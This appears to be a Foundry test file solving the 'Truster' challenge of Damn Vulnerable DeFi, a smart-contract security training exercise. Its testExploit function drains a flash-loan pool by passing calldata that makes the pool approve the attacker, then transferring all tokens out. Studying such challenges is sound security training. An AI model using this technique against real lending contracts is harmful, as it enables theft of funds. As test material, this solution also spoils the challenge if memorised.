// SPDX-License-Identifier: MIT
pragma solidity >=0.8.0;

import {DSTest} from "ds-test/test.sol";
import {Utilities} from "../../utils/Utilities.sol";
import {console} from "../../utils/Console.sol";
import {Vm} from "forge-std/Vm.sol";

import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
import {TrusterLenderPool} from "../../../Contracts/truster/TrusterLenderPool.sol";

contract Truster is DSTest {
    Vm internal immutable vm = Vm(HEVM_ADDRESS);

    uint256 internal constant TOKENS_IN_POOL = 1_000_000e18;

    Utilities internal utils;
    TrusterLenderPool internal trusterLenderPool;
    DamnValuableToken internal dvt;
    address payable internal attacker;

    function setUp() public {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        utils = new Utilities();
        address payable[] memory users = utils.createUsers(1);
        attacker = users[0];
        vm.label(attacker, "Attacker");

        dvt = new DamnValuableToken();
        vm.label(address(dvt), "DVT");

        trusterLenderPool = new TrusterLenderPool(address(dvt));
        vm.label(address(trusterLenderPool), "Truster Lender Pool");

        dvt.transfer(address(trusterLenderPool), TOKENS_IN_POOL);

        assertEq(dvt.balanceOf(address(trusterLenderPool)), TOKENS_IN_POOL);

        console.log(unicode"🧨 PREPARED TO BREAK THINGS 🧨");
    }

    function testExploit() public {
        /** EXPLOIT START **/

        // The vulnerability here is that target and borrower can be 2 different addresses -->
        // this allows me to call approve on dvt with msg.sender being the pool and borrower being the pool which
        // results in the tx to not revert on the "balanceAfter < balanceBefore" condition

        vm.startPrank(attacker);

        trusterLenderPool.flashLoan(
            TOKENS_IN_POOL,
            address(trusterLenderPool),
            address(dvt),
            abi.encodeWithSignature(
                "approve(address,uint256)",
                attacker,
                TOKENS_IN_POOL
            )
        );

        dvt.transferFrom(address(trusterLenderPool), attacker, TOKENS_IN_POOL);

        vm.stopPrank();
        /** EXPLOIT END **/
        validation();
    }

    function validation() internal {
        // Attacker has taken all tokens from the pool
        assertEq(dvt.balanceOf(address(trusterLenderPool)), 0);
        assertEq(dvt.balanceOf(address(attacker)), TOKENS_IN_POOL);
    }
}
